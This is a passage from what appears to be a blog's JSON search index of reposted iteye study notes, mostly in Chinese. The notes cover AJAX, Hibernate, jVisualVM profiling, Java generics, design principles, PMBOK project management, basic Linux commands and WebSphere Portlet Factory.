      "content": "我们知道流行的AJAX库帮我们解决了跨浏览器的DOM 查询，DOM操作，CSS操作，AJAX调用等问题。不知以下两个问题是怎么解决的：   1. 浏览器的back &amp; forward问题，浏览器能记住在各个点上的AJAX操作吗？   2. 并发问题。因为AJAX应用的重要场景是异步调用。假如一个HTML页面上同时产生了两个AJAX调用Invoke1 和 Invoke2。它们的回调函数操作了同一个DOM对象。Invoke1首先调用，其次Invoke2。但是Invoke2首先执行完成返回到浏览器更新DOM对象，再接着是Invoke1返回覆盖了Invoke2更新过的DOM对象。也就是Invoke2的结果丢失了。     不知道目前兄弟们是怎么解决这两个问题的。 ：） ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-148/"
    } ,
  
    {
      "title"    : "Hibernate 小知识",
      "category" : "iteye",
      "content": " inverse在one-to-many和many-to-many中   inverse 默认值是false   根据hibernate reference所说： the non-inverse side is used to save the in-memory representation to the database. The non-inverse side即 inverse=false的那一端。一般one-to-many关系one端设置成inverse=true，也即由多方维护关系。一个好处是不会因为一方一次修改，多方所有相关记录都要更新;many-to-many关系可以任选一端设置成inverse=true.   2. unsaved-value null, any,none 主要是cascade insert/update时，判断对象链上的隐含对象是插入还是更新到数据库。一般pojo主键是对象时新建默认是null,这时进行插入；否则该pojo就是从数据库中load出来的pojo，需要进行更新。 关于none和any的设置不是很清楚。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-149/"
    } ,
  
    {
      "title"    : "jvisualVM profiling分析",
      "category" : "iteye",
      "content": " 用jdk1.6自带的JVisualVM版本好像比较低，最好用比较新的，比如我用过1.3.1 2. to profile a remote app such as in a remote linux machine, we need to start JMX port in remote app as this way java -Dcom.sun.management.jmxremote.port=3333      -Dcom.sun.management.jmxremote.ssl=false      -Dcom.sun.management.jmxremote.authenticate=false      YourJavaApp 3. in jvisualVM client, 在 “远程” 节点下添加 远程主机名或者ip地址（不需要提供port） 在远程节点下将出现新添加的子节点。在子节点下可以继续添加“JMX”节点，提供远程主机的ip:port即可， port就是我们上面定义的3333 4.双击即可打开，在sampler tab可mornitor CPU运行时间基于方法，类，或者包名。从中可以发现那个所占CPU的比例高，再从中发现性能瓶颈。 5. 可以save snapshot方便事后分析，很有用。方便team一块分析，共享。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-15/"
    } ,
  
    {
      "title"    : "[转] 同步与异步 阻塞与非阻塞IO",
      "category" : "iteye",
      "content": "摘自：http://leili.iteye.com/blog/1580466 阻塞与非阻塞 区别是读写IO时是否设置了文件描述符的属性O_NONBLOCK。　如果设置了该属性，io操作立刻返回但不保证IO读写成功。 同步与非同步 同步模式下调用者要么一直等阻塞IO返回结果；要么主动轮询非阻塞IO是否成功。也就是需要调用者去问操作系统 非同步模式下有两种方式： 其一是用Select函数，该情况下IO是非阻塞的，但Select是阻塞的，select用来确定指定的文件描述符是否有变化。用select的好处是可以为多个描述符提供通知，提高了并发性。 其二是用回调，当操作系统kernel执行完IO，返回read的响应，就会产生一个信号或执行一个基于线程的回调函数来完成这次 I/O 处理过程。函数， ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-16/"
    } ,
  
    {
      "title"    : "平移数组中部分连续元素",
      "category" : "iteye",
      "content": "O(n)时间复杂度，平移数组中部分连续元素   假设数组（X,Y)，一共N个元素。X是数组前K个元素，Y是后N-K个元素。现在需要将前K个元素循环右移，变成(Y,X). 方法是：（Y,X) = (X',Y')'   X' 指对数组X中元素逆序。这样可以在常数时间内移动K个元素。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-18/"
    } ,
  
    {
      "title"    : "设计原则",
      "category" : "iteye",
      "content": "SOLID SRP    A Single Responsibility Principle    A class should have one, and only one, reason to change. OCP    A module should be open for extension but closed for modification.    polymorphism is a way to implement it.    Q: what's the difference between static polymorphism and dynamic polymorphism? The Liskov Substitution Principle(LSP)    Subclasses should be substitutable for their base classes. we should note the canonical Ellipse/Circle dilemma The Dependency Inversion Principle(DIP)    Depend upon Abstractions instead of concretions. we should note the difference between procedural architecture and OO architecture. The Interface Segregation Principle(ISP)    Many Client specific interfaces are better than one general purpose interface. so we can isolate the individule interface change. we can define interface according to the client category. Any change needed to be made on the existing interfaces, we can add a new interface instead of changing the existing interfaces. So we can avoid the issue of recompilation and redeployment. Principles of Package Architecture how to group together package The Release Reuse Equivalency Principle(REP) The granule of resue is the granule of release The Common Closure Principle(CCP) Classes that change together, belong together. So the package impact from release will be minimized. The Common Reuse Principle(CRP) Classes that aren't resued together should not be grouped together The Acyclic Dependencies Principle(ADP) The dependencies between packages must not form cycles. Cycles can be broken in two ways: create a new package make use of the DIP and ISP add a interface on the user side(who use the function) and the other side implement the interface. The Stable Dependencies Principle(SDP) Depend in the direction of stability. I(Instability) = Ce/(Ca+Ce) Ce: Efferent Coupling, outgoing dependencies Ca: Afferent Coupling, incoming dependencies So SDP can be rephrased as: Depend upon package whose I metric is lower than yours. The Stable Abstractions Principle(SAP) stable package should be abstract packages. The stable package maybe hard to change, so it is not flexible; But we can make the stable package abstract, so it is easy to extend. This is just a restatement of the DIP. That is , the package that the most depended upon should also be the most abstract. A(Abstractness) = Na/Nc Na: Number of abstract classes in the package Nc: Number of classes in the package KISS Keep it simple and stupid. Less is more. CoC Convention over Configuration, e.g. ROR YAGNI You Ain't Gonna need it. 极限编程中的一个概念，只实现目前需要的功能。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-19/"
    } ,
  
    {
      "title"    : "jdk泛型",
      "category" : "iteye",
      "content": "泛型不是协变的 List&lt;Object&gt; 不是 List&lt;String&gt; 的父类型。   问号 类型通配符 List 是任何泛型 List 的父类型，所以您可以将 List、List 或 List>> 代入方法参数是List地方   但是把List类型的变量赋给List后不是所有的操作都支持。因为list并不知道类型信息，所有与类型相关的方法不能工作，比如add(new Integer(1));然而不依赖与类型的方法仍然工作，比如clear()     泛型参数用在类上时，约束的是类中的所有用到它的方法；泛型参数用到方法级别时约束到的是方法级别的   用以下方式申明 public &lt;T&gt; T ifThenElse(boolean b, T first, T second) { return b ? first : second; } 调用时通过类型推理，用以下方式调用 String s = ifThenElse(b, &quot;a&quot;, &quot;b&quot;); Integer i = ifThenElse(b, new Integer(1), new Integer(2)); 受限制的类型参数   只允许用Number或者Number子类的类型参数。 public class Matrix&lt;V extends Number&gt; { ... } 注意不用受限制的类型参数时，默认是从Object的继承的。即不用extends 语句时取出的都是Object   上限通配符和下限通配符   上限通配符 interface Collection&lt;V&gt; { boolean addAll(Collection&lt;? extends V&gt;); } 该定义组合了通配符类型参数和有限制类型参数，允许您将 Collection 的内容添加到 Collection。允许加入V或者V的子类   下限通配符   Collection&lt;? super Foo&gt; 只有通配符可以具有下限。 可以加入V或者V的父类。下例中copyTo() 方法将 Bunch 的所有值复制到指定的集合中。不是指定它必须是一个 Collection，而可以指定它是一个 Collection&lt;? super V&gt;，这意味着 copyTo() 可以将 Bunch 的内容复制到 Collection 或 Collection，而不只是可以复制到 Collection。 class Bunch&lt;V&gt; { public void add(V value) { ... } public void copyTo(Collection&lt;? super V&gt;) { ... } ... } 除了jdk中collection api加入泛型支持，其他接口，类的泛型声明实现并不是很好理解   接口 public interface Comparable&lt;T&gt; { public boolean compareTo(T other); } 实现 public class String implements Comparable&lt;String&gt; { ... }   在下例中，您定义了一个泛型方法，在类型 T 上泛型化，您约束该类型扩展（实现） Comparable。 public static &lt;T extends Comparable&lt;T&gt;&gt; T max(T t1, T t2) { if (t1.compareTo(t2) &gt; 0)  return t1; else return t2; } 调用 String s = max(&quot;moo&quot;, &quot;bark&quot;); ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-2/"
    } ,
  
    {
      "title"    : "PMBOK 学习笔记",
      "category" : "iteye",
      "content": "PMBOK(Project Management Body of Knowledge)PMBOK Guide divides into 44 processes that fall into 5 process groups. 5 process groups are: Initiating: Develop Project Charter,Develop Preliminary Scope Statement Plannig:Develop Project Management Plan,Risk Identification,Quality Planning,Activity Duration Estimation Executing: Direct and Manage Project Work,Information Distribution Monitoring&amp;Controlling: Scope Control,Monitor and Control Project Work,Schedule Control Closing: Close Project 9 knowledage areas Risk Quality Scope Procurement: Defining contracts and choosing a contractor to do work for the project Communication Time Integration Cost Human Resource Functional Organization/Matrix Organization/Projectized Organization project three constraints(triple constraint):Scope,Time,Cost(note Qulitity not includes) A stakeholder is anyone who is affected by the cost,time or scope of the project. The sponsor the the person who pays for the project The Seven Integration Management processes: 1. Develop Project Charter 2. Develop Preliminary Scope Statement 3. Develop Project Management Plan 4. Direct and Manage project Execution 5. Monitor and Control Project Work 6. Integrated Change Control 7. Close Project Preliminary Scope Statement includes: 1. Project and product objectives 2. Product or Service Requirements and Characteristics 3. Product Acceptance Criteria 4. Project Boundaries 5. Project Deliverables 6. Project Constraints and Assumptions 7. Initial Project Organization 8. Initial Defined Risks 9. Schedules Milestones 10. Order of Magnitude Cost Estimate 11. Project Configuration Management Requirements 12. Approval Requirement The project management plan is a collection of other plans: 1. scope management 2. time management 3. cost management 4. quality management 5. human resource management 6. communications management 7. risk management8. procurement ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-20/"
    } ,
  
    {
      "title"    : "Scope Management",
      "category" : "iteye",
      "content": "Scope management means figuring out what's out of scope, not just what's part of scope. five scope management processes: 1. scope planning output: scope management plan 2. scope definition output:scope statement scope definition tools&amp;techniques:stakeholder analysis,product ayalysis,alternatives idenfication,expert judgment 3. create WBS(Work Breakdown Structure) Project is broken down by phase or deliverable. A WBS can be structued any way it make sense to you and your project team. Work package is a unit of work in the WBS. The WBS dictionary is a description of each work package listed in the WBS. tools&amp;techniques: decomposition and templates&amp;forms of similar past project output: work breakdown structure, WBS dictionary, scope baseline,updates to the scope statement, updates to the scope management plan, change requests 4. scope change It describes how specific approved changes are used to update the project documents 5. scope verification to gain formal acceptance of the project deliverables from the sponsor and stakeholders tools: inspection ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-21/"
    } ,
  
    {
      "title"    : "Time Management",
      "category" : "iteye",
      "content": "Time Management Time Management is all about breaking the work down into activities, so you can put them in order and come up with estimates for each of them. 1. Activity Definition process divide the work package(from WBS) into activities that can be estimated. tools and techniques: Decomposiiton,Templates(previous project),Expert Judgment, Planning Component(placeholder for unknow) output: Activity List, Activity Attributes(order,predeccessor,successor,resource,time constraints), Milestone List(checkpoints) Requested Changes 2. Activity Sequencing: tools&amp;techniques:Precedence Diagramming Method(PDM), also called Activity on Node(AON), follow finish-to-start predecessorArrow Diagramming Method(ADM) predecessor method includes: Finish to Start(FS), Start to Start(SS): activity begins at the same time Finish to Finish(FF): activity finishs at the same time output: network diagram 3. Activity Resource Estimation process input: a. Resource Availabilityb. Activity Listc. Activity Attributesd. Enterprise Environment Factors/Organizational Process Assets/Project Management Plan tools&amp;techniques:a. expert judgmentb. alternatives analysisc. published estimating datad. project management software(e.g. Microsoft Project)e. bottom-up estimating output: resource requirements resource calendar 4. Activity Duration Estimating input: a. resource requirements b. resource calendar c. activity list d. activity attributes e. project scope statement f. organizational process assets/enterprise environmental factors/project management plan tools&amp;techniques:a. expert judgementb. analogous estimatingc. parametric estimatingd. three-point estimatesf. reserve analysis output: activity duration estimates ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-22/"
    } ,
  
    {
      "title"    : "Time Management - Schedule Development Process",
      "category" : "iteye",
      "content": "Schedule Development Process It is the core of time management. it's the process where you put it all together. input: Resource Calendar/Network Diagram/Activity List/Activity Attributes/Activity Duration Estimates /Activity Resource Requirements/Project Management Plan/Organizational Process Assets/ Scope Statement output: schedule development The Critial Path is the longest duration of activities list(from start to end) About Activity node(apart from duration), also includes: ES(Early Start): the early start of the first activity in a path is one. the early start of an activity is the early finish of the previous activity plus one EF(Early Finish): the early finish of an activity is its ES plus its duration minus one LS(late start): start with the critical path and take a backward pass through the path. move backwards through the path, filling in the LS by subtracting the duration from the LF and add one. LF(late finish): start by filling in the LF of the last activity in each path which is the same as the EF of the last activity in the crital path. the LF for each activity is the LS of the next one on the paht minus one. tools&amp;techniques: a. Monte Carlo Analysis b. Schedule Model(PM software ) c. critical chain method( resource dependencies) d. resource leveling e. applying calendarsf. adjusting leads and lags output:a. scheduleb. milestone listc. schedule baselined. updates and requested changes ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-23/"
    } ,
  
    {
      "title"    : "Cost Management",
      "category" : "iteye",
      "content": " Cost Estimationg process input: Scope Statement WBS WBS Dictionary Project Management Plan Organization Process Assets Enterprise Environmental Factors tools: Bottom-up estimating Analogous estimating Project management software Parametric estimating Determine Resource Cost Rates Vendor Bid Analysis Reserve Analysis Cost of Quality output: Activity cost estimates Activity cost estimates supporting detail Updates to the cost management plan Requested changes(scope,schedule,risk) 2. Cost Budgeting process input: Activiy Cost Estimate Cost Estimate Suporting Detail Project Management Plan Cost Management Plan Project Scope Statement Contract Resource Calendar Schedule Work Breakdown Structure WBS Dictionary tools: cost aggregation(from activity estimates to control accounts on WBS) come up with reserves Use parametric estimation Funding Limit Reconciliation output: The Cost Baseline Figure out funding requirements(how and when spend money) Update cost plan 3. Cost Control process input: The Cost Baseline Project funding requirements Work Performance Information Performance reports Approved Change Requests Project Management Plan tools: Cost change control system Project management software Performance measurement analysis Variance analysis Project performance reviews Forecasting Earned Value Techniques: BAC(Budget At Completion) PV(Planned Value) PV = BAC * (Planned/Complete) ----as per schedule EV(Earned Value), measures how much work that is been done EV = BAC * (Actual/Complete) SPI(Schedule Performance Index) SPI = EV/PV if SPI&gt;1, ahead of schedule; otherwise, behind schedule. SV(Schedule Variance) SV = EV - PV Actual Cost(how much you've spend) CPI(Cost Performance Index) ---whether you're over or under budget, or within budget or not CPI = EV / AC CV(Cost Variance) --- how much above or below your budget you are CV = EV - AC EAC(Estimate At Completion) ---predict the total cost of the project EAC = BAC/CPI ETC(Estimate to Complete) --- how much more money you'll need ETC = EAC - AC VAC(Variance at Completion) --- predicts the variance when the project is done VAC = BAC - EAC page380 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-24/"
    } ,
  
    {
      "title"    : "Quality Management",
      "category" : "iteye",
      "content": " Quality Planning input: Organizational Process Assets Enterprise Environmental Factors Project Management Plan Project Scope statement tools: Cost benefit analysis Benchmarking Design of Experiments(test planning) Cost of Quality output: ChecklistsProcess Improvement Plan Quality Baseline Quality Metrics Quality Management Plan Project Management Plan updates 2. Perform Quality Control input:Quality Management Plan Checklists Deliverables Work Performance Information Metrics Organizational Process Assets tools: Control Charts(rule of seven) Cause and effect diagrams Pareto charts(80/20 rules, find the main cause) Flowcharts(show you a picture of the whole process) Histograms(help make decision) Run Charts(trends of your project) Scatter charts Inspection Defect repair review statistical Sampling output: Quality control measurements Recommended corrective actions Recommended preventative actions Recommended defect repairs Recommended defect repairs Validated deliverables and validated defect repair Quality baseline updates Requested changes Qrganizational Process Assets Updates(templates for Quality metrics or checklists) Project Management Plan Updates 3. Perfrom Quality Assurance input: Quality Metrics Quality Control Measurements Work Performance Information Implemented Change Requests Quality Management Plan Organizational Process Assets Process Improvement Plan Implemented Corrective Actions Implemented Defect Repair Implemented Preventative Actions Tools: Quality Planning tools and techniques Quality Control tools and techniques Quality AuditsProcess Analysis output: Project Management Plan Updates Requested Changes Recommended Corrective Actions Organizational Process Assets Updates ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-25/"
    } ,
  
    {
      "title"    : "Human Resource Management",
      "category" : "iteye",
      "content": " Human Resource Planning input: Enterprise Environmental Factors: company's culture and structure,common languages,technical disciplines Organizational Process Assets: templates and lessons learned from past projects Project Management Plan: resource requirements for each activity tools: Organization Charts(reporting relationships) output: Staffing Management Plan(Timetable,Resource Histogram): who will be on your project, when they'll do the work and for how long, the reward system to keep the team motivated Roles and Responsibilities(RACI matrix): title, authority, responsible for specific deliverables Project Organization Charts: reporting structure 2. Acquire Project Team input: Staffing Management Plan Project Management Plan Project Organization Charts Roles and Responsibilities Enterprise Environmental Factors Organizational Process Assets tools: Negotiation Pre-Assignment Virtual Teams Acquisition Output: Staffing Assignments Resource Availability Update the Staffing Management Plan 3. Develop Project Team(evaluate performance and set up motivational factors) input:Staffing Management PlanResource AvailabilityStaffing Assignments Tools:Recognition and RewardsTrainingGround rulesTeam-building activitiesCo-location output:Team Performance Assessment 4. Manage Project Team(solve conflicts) input: Work Performance InformationPerformance ReportsStaffing Management PlanProject Organization Charts Roles and Responsibilities Enterprise Environmental FactorsOrganizational Process AssetsProject Management Plan tools:Conflict ManagementPerformance AppraisalsIssue logs output: Requested Changes Recommended corrective actions Recommended preventive actions Updates to the organizational process assets Updates to the project management plan ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-26/"
    } ,
  
    {
      "title"    : "Communication Management",
      "category" : "iteye",
      "content": "Communications Management 1. Communications Requirements Analysis input:Enterprise Environmental Factors Organizational Process Assets Project Scope Statement Project Management Plan output: Communication Plan(who should communicate with whom and how often) 2. Information Distribution input:Communication Plan Tools: Communication skills Formal Written Informal Written Formal Verbal Informal Verbal Effective Communication Nonverbal communication Paralingual communication(tone and pitch) Feedback Information gathering and retrieval systems Information distribution methods Lessons learned Output: Organizational Process Asset updates Requested changes 3. Performance Reporting process Input: Work Performance Information Deliverables Performance Measurements Forecasted Completion Quality Control Measurements Approved Changes Requests Project Management Plan Tools: Information Presentation Tools Performance Information Gathering and Compilation Status Review Meetings Time Reporting System Cost Reporting System Output: Performance report Forecasts Lessons Learned Changes 4. Manage Stakeholders(resolve issues) every team member is also a stakeholder. Input: Communications Management Plan Organizational Process Assets Tools: Communications Methods Face-to-face communication Holding kickoff meetings Issue Logs Output: Resolved Issues Approved Change Requests Approved Corrective Actions Organizational Process Asset Updates Project Management Plan Updates ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-27/"
    } ,
  
    {
      "title"    : "Risk Management",
      "category" : "iteye",
      "content": "Risk Management 1. Risk Management Planning Input: Organizational Process Assets Enterprise Enviromental Factors Project Management Plan Project Scope Statement Tools:Planning Meetings and Analysis Output: Risk Management Plan(who, how, how often), in Risk Management Plan, come up with RBS(Risk Breakdown Structure), then Avoided/Mitigated/Transferred/Accepted the risk 2. Risk Identification Input: Risk Management Plan Project Management Plan Project Scope Statement Organizational Process Assets Enterprise Environmental Factors Tools: Information Gathering Techniques(Gathering information from people and making sure it's right)which includes: Brainstorming, Interviews, The Delphi technique,get opinions and ideas from experts anonymously SWOT analysis(strengths,weaknesses,opportunities,and threats) Root cause identification Documentation reviews Assumptions analysis Checklist analysis Diagramming techniques Output: Risk Register 3. Qualitative Risk Analysis(ranking risk based on probability and impact) Input: Organizational Process Assets Risk Register Risk Management Plan Project Scope Statement Tools: Risk data quality assessment Risk categorization Risk urgency assessment Risk probability and impact assessment Probability and impact matrix Output: updated risk register(add columns Category,Priority,Urgency) 4. Quantitative Risk Analysis(ranking risk based on probability and impact) Input: Organizational Process Assets Risk Register(after qualitative analysis) Project Management Plan Risk Management Plan Project Scope Statement Tools: EMV(Expected Monetary Value) Decision Tree Analysis Output: updated Risk Register 5. Risk Response planning Input: Risk Register Risk Management Plan Tools: strategies for handling negative risk,avoid&amp;mitigate&amp;transfer&amp;acceptstrategies for handling positive risk,Exploit&amp;share&amp;enhance&amp;accept Output: add risk response to the register(risk owner,response) project management plan update scontract updates 6. Risk Monitoring and Conrol process Input: Risk Register Project Management Plan Approved Change Requests Work Performance Information Performance Reports Tools: Risk reassessment Variance and trend analysis Reserve analysis Risk audits Technical performance measurement Status meetings Output: Risk Register Updates Project Management Plan Updates Requested Changes Organizational Process Assets Recommended Corrective Actions Recommended Preventative Actions ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-28/"
    } ,
  
    {
      "title"    : "Precurement Management",
      "category" : "iteye",
      "content": "Precurement Management(采购) 1. Plan Purchases and Acquisitions process Input: Work Breakdown Structure WBS Dictionary Project Scope Statement Project Management Plan Enterprise Environmental Factors Organizational Process Assets Tools: Make or buy analysis Expert Judgment Contract types Output: Procurement Management Plan Contract Statement of Work Make or Buy Decisions Requested Changes 2. Plan Contracting process Input: Procurement Management Plan Contract Statement of Work Make or Buy Decisions Organizational Process Assets Tools: Standard Forms(RFP,Request for Proposals) Expert Judgement Output: Procurement Documents Evaluation Criteria Contract Statement of Work Updates 3. Request Seller Responses process Input: Procurement Documents Procurement Management Plan Organizational Process Assets Tools: Bidder Conferences Advertising Develop Qualified Sellers List Output: Procurement Document Package Qualified Sellers List Proposals 4. Select Sellers process Input: Procurement Document Package Qualified Sellers List Evaluation Criteria Proposals Organizational Process Assets Procurement Management Plan Tools: Weighting System Screening System Independent Estimates Seller Rating System Expert Judgment Contract Negotiation Proposal Evaluation Techniques Output: Selected Sellers Contract Contract Management Plan Resource Availability Requested Changes Procurement Management Plan Updates 5. Contract Administration Process Input: Approved Change Requests Work Performance Information Performance Reports Contract Management Plan ContractSelected Sellers Tools: Payment System Records Management System Information Technology Claims Administration Performance Reporting Buyer-Conducted Performance Review Inspections and Audits Contract Change Control System Output: Contract documentation Requested changes Updates to Organizational process assets Recommended corrective actions Project management plan 6. Contract Closure Input:Contract Management Plan Procurement Management Plan Contract Documentation Contract Closure Procedure Tools: Procurement audits Records Management system Outputs: Closed Contracts Organizational Process Assets ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-29/"
    } ,
  
    {
      "title"    : "linux命令",
      "category" : "iteye",
      "content": " dirname 与 pwd pwd返回的是执行时当前路径 dirname 后面跟一个script文件参数，返回的是执行的script文件所在的路径 差别在于有时在一个目录路径下执行另一个路径下的script，这时这两个路径不同   ` 使用反短斜线可以将一个命令的输出作为另外一个命令的一个命令行参数 用来查找过去24小时（-mtime –2则表示过去48小时）内修改过的文件,并将结果打包。 #!/bin/sh # The ticks are backticks (`) not normal quotes ('): tar -zcvf lastmod.tar.gz find . -mtime -1 -type f -print   sed Sed是一个基本的查找替换程序 将linuxfocus 替换为 LinuxFocus ：  tcat text.file | sed 's/linuxfocus/LinuxFocus/' &gt; newtext.file   awk awk 用来从文本文件中提取字段。缺省地，字段分割符是空格，可以使用-F指定其他分割符。 cat file.txt | awk -F, '{print $1 &quot;,&quot; $3 }' 这里我们使用，作为字段分割符，同时打印 第一个和第三个字段   ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-3/"
    } ,
  
    {
      "title"    : "Hibernate Cache",
      "category" : "iteye",
      "content": " get/load区别 如果记录存在，get返回对象（或代理对象）；否则返回null。 如果记录存在，load返回对象；否则返回 NotObjectFoundException 2.hibernate Cache 2.1 一级缓存，在当前session内 2.2 Query Cache Cache queries and results. 方法： 1. 在hiberante Configuration 文件中： true 2. 查询时 Query query = session.createQuery(&quot;from Person p where p.id=1&quot;); query.setCacheable(true); 2.3 二级缓存, 跨session . 如EHCache 3. load 与 CreateQuery 在处理Cache的区别 首先,load时在一个session中，一级缓存总是有效的。比如下面的只issue sql操作一次   Session session = getSessionFactory().openSession(); Transaction tx = session.beginTransaction(); Person person1 = (Person) session.load(Person.class, 1L); System.out.println(person1.getFirstName()); Person person2 = (Person) session.load(Person.class, 1L); System.out.println(person2.getFirstName()); tx.commit(); session.close(); 其次,如果用CreateQuery有点不同，比若下面的需要issue sql操作两次 Session session = getSessionFactory().openSession(); Transaction tx = session.beginTransaction(); Query query = session.createQuery(&quot;from Person p where p.id=1&quot;); Iterator it = query.list().iterator(); while (it.hasNext ()){ Person p = (Person) it.next(); System.out.println(p.getFirstName()); } query = session.createQuery(&quot;from Person p where p.id=1&quot;); it = query.list().iterator(); while (it.hasNext ()){ Person p = (Person) it.next(); System.out.println(p.getFirstName()); } tx.commit(); session.close(); 原因是session cache时是根据key(load方法中传入的ID)来缓存的。解决的方法是： 1. 用load，如上面的代码 2. 用查询缓存，如上面的介绍 Session session = getSessionFactory().openSession(); Transaction tx = session.beginTransaction(); Query query = session.createQuery(&quot;from Person p where p.id=1&quot;); query.setCacheable(true); Iterator it = query.list().iterator(); while (it.hasNext ()){ Person p = (Person) it.next(); System.out.println(p.getFirstName()); } query = session.createQuery(&quot;from Person p where p.id=1&quot;); query.setCacheable(true); it = query.list().iterator(); while (it.hasNext ()){ Person p = (Person) it.next(); System.out.println(p.getFirstName()); } tx.commit(); session.close(); ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-30/"
    } ,
  
    {
      "title"    : "应用集成",
      "category" : "iteye",
      "content": " JAX-RPC    AXIS 1实现了这种RPC的方式，基于SOAP,WSDL. AXIS 1是web service的一种实现方式？    AXIS 2采用了JAX-WS 2. websphere SOA的三个概念有: WPS(Websphere Process Server,这个我开始老是搞错，以为是portal server); ESB; WSRR(Websphere Service Registry Repository) WID(WebSphere Integration Developer)用来开发SCA,ESB的平台。因为SOA的这些东东RAD(Rational Applicaiton Developer)是搞不定的。 同样这些SOA的组件需要在WebSphere Process Server下跑。WAS下是跑不动的。不过止今还没见过WPS,WID这些神兵利器。也就玩玩WAS，RAD了，还是在公司。：&lt; ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-31/"
    } ,
  
    {
      "title"    : "Eclipse + Java SE 6 快速建立web service",
      "category" : "iteye",
      "content": "from https://www6.software.ibm.com/developerworks/cn/education/webservices/ws-eclipse-javase1/section2.html 1. new Java Project    make sure JRE is JAVA SE 6 2. create POJO package com.myfirst.wsServer; import Javax.jws.WebService; @WebService public class SayHello { private static final String SALUTATION = &quot;Hello&quot;; public String getGreeting( String name ) { return SALUTATION + &quot; &quot; + name; } } 3. 用 wsgen 生成中间文件    wsgen -cp ./bin -keep -s ./src -d ./bin com.myfirst.wsServer.SayHello 4. web service publish package com.myfirst.wsServer; import Javax.xml.ws.Endpoint; public class RunService { /** @param args */ public static void main(String[] args) { System.out.println(&quot;SayHello Web Service started.&quot;); Endpoint.publish(&quot;http://localhost:8080/wsServerExample&quot;, new SayHello()); } } 5. run as java applicaiton 启动服务 6. 通过 http://localhost:8080/wsServerExample?wsdl 查看wsdl文件内容 7. Eclipse 提供了 Run &gt; Launch the Web Services Explorer 来测试web service. 根据WSDL文件就可以了。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-32/"
    } ,
  
    {
      "title"    : "WPF",
      "category" : "iteye",
      "content": "WPF trial: http://www.ibm.com/developerworks/downloads/ws/wpf/index.html?S_TACT=105AGX28&amp;S_CMP=DLMAIN http://www-10.lotus.com/ldd/pfwiki.nsf RAD + web service WPF + web service WPF + LOG WPF + tomcat + debug http://www-10.lotus.com/ldd/pfwiki.nsf/dx/-debugging-information http://www.ibm.com/developerworks/forums/thread.jspa?threadID=120264 generate schema: http://www-10.lotus.com/ldd/pfwiki.nsf/dx/08122008084644PMWEB2X9.htm web service: http://www-10.lotus.com/ldd/pfwiki.nsf/dx/06182008070049PMWEBUZ3.htm ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-33/"
    } ,
  
    {
      "title"    : "Websphere Deployment Management",
      "category" : "iteye",
      "content": "Webshphere Server: vertical clustering, multi-server in SMP(symmetric multi-processor) horizontal clustering, multi physical server ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-34/"
    } ,
  
    {
      "title"    : "WPF Knowledge",
      "category" : "iteye",
      "content": " import model/linked model/container model 1.1 Imported Model Builder: Host Model and target Model share the same WebApp,  target model are imported into the host model at generation time. The host model can invoke all the builder calls of the target model, but cannot change any of the builder imputs. 1.2 Linked Model Builder: Host model and Linked model use two separate WebApp. From a host model, we can access any public methods, Linked Java Objects(LJOs), and action lists in Linked Model. They are roughly analogous to classes in java. Linked Model builder is best suited for linking to data and logic that resides in another model. It is not suited for linking to any user interface elements(pages, buttons, forms, and so forth) that may reside in another model. 1.3 Model Container Builder: The Model Container builder allows a model to host another model at the named page location.  It is ideal for retrieving user interface components from another model. 2. app war/portal war/ dev war 3. lifecycle, profile -&gt; generation time -&gt; execution time 4. portal server/portlet container/portlet portal server: first received request from the client forward the request to portlet container aggregating the content produced by the protlets portlet Container: contains and run portlets, manages portlets lifecycle, provides portlets with the required runtime environment,provides persistent storage for portlet perferences 5. portlet container / servlet container portlets and servlets are java technology based web components both are managed by a specialized container both generate dynamic content lifecycle is managed by a container inteact with web client via a request/response paradigm difference: portlet only generate markup fragments, not complete documents. The portal aggregates portlet fragments into a complete portal page portlet are not directly bound to a URL web clients interact with portlets through a portal system portlets have a refined request handling, action requests and render requests portlets have predefined portlet mode and window states portlets can exist many times in a portal page portlets have means for accessing and storing persistent configuration and cusomization data portlets have access to user profile information 6. JSF Portlet Framework in RAD 7 7. Thems and stylesheet for portal server 8. configure Web service URL in WPF: first approach: 1. configure in the property file 2. load in LJO and set to share variables 3. in web service builder &quot;advance&quot; section, use the shared variables to override host,url,etc. there are no UI for editing second approach: 1. when export model to portlet, in portlet adapter builder, configure preference in &quot;advance&quot; section, each url associated with an item. 2. in LJO, get httpservlet request from webAppAccess; then get portlet request from http request; then get preference from portlet requet; last we can get the url we configurated in preference. I am not sure if we can configure the preference on UI ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-35/"
    } ,
  
    {
      "title"    : "Java Notes",
      "category" : "iteye",
      "content": " In JDK5, Annotation is introduced. Annotation just simplify programming, not for performance raising DD(deployment description) over Annotation CoC, Convention over Configuration DRY, Don't Repeat Yourself heap size vs. GC big heap size : GC less frequent, slower(a lot of memory to search through)   small: GC more frequent, fast ArrayList.toArray(new xxx[0]), 参数用零长度相应Java对象的数组即可。 ",
      "url"      : "http://localhost:4000/2017/02/12/iteye-36/"
    } ,
  
    {
      "title"    : "NFR",
      "category" : "iteye",
